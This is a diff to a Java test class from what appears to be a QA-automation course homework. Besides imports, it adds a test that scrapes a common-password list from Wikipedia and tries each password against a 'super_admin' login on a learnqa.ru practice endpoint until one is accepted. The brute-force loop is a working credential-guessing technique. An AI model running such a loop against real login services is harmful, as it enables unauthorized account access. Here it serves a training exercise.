@@ -1,17 +1,23 @@
 package firstLessons;
 
+import com.google.common.collect.ImmutableSet;
 import io.restassured.RestAssured;
 import io.restassured.http.Headers;
 import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
+import io.restassured.response.ResponseBody;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.params.ParameterizedTest;
 import org.junit.jupiter.params.provider.Arguments;
 import org.junit.jupiter.params.provider.MethodSource;
 import org.junit.jupiter.params.provider.ValueSource;
+import org.openqa.selenium.By;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.WebElement;
+import org.openqa.selenium.chrome.ChromeDriver;
 
-import java.util.HashMap;
-import java.util.Map;
+import java.sql.Driver;
+import java.util.*;
 import java.util.stream.Stream;
 
 import static lib.Assertions.assertStringLength;
@@ -90,6 +96,48 @@ public class Lesson3Homework
                 Arguments.of("Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
                         "Mobile", "No", "iPhone")
         );
+    }
+
+    @Test
+    public void testFindPassword(){
+        String passwordsUrl = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords";
+        String tableTitle = "Top 25 most common passwords by year according to SplashData";
+        By by = By.xpath(".//*[contains(text(),'" + tableTitle + "')]/..//td[@align='left']");
+
+        WebDriver driver = new ChromeDriver();
+        driver.get(passwordsUrl);
+        List<WebElement> passwordElements = driver.findElements(by);
+
+        Set<String> passwordSet = new HashSet<>();
+        passwordElements.forEach(p -> passwordSet.add(p.getText()));
+        driver.close();
+
+        for(String password : passwordSet) {
+
+            Map<String, String> loginData = new HashMap<>();
+            loginData.put("login", "super_admin");
+            loginData.put("password", password);
+
+            Response cookieResponse = RestAssured
+                    .given()
+                    .body(loginData)
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String cookie = cookieResponse.getCookie("auth_cookie");
+
+            Response loginResponse = RestAssured
+                    .given()
+                    .body(loginData)
+                    .cookie("auth_cookie", cookie)
+                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+
+            if(loginResponse.asPrettyString().contains("You are authorized")){
+                System.out.println("Proper password is '" + password + "'");
+                return;
+            }
+        }
     }
 }
 
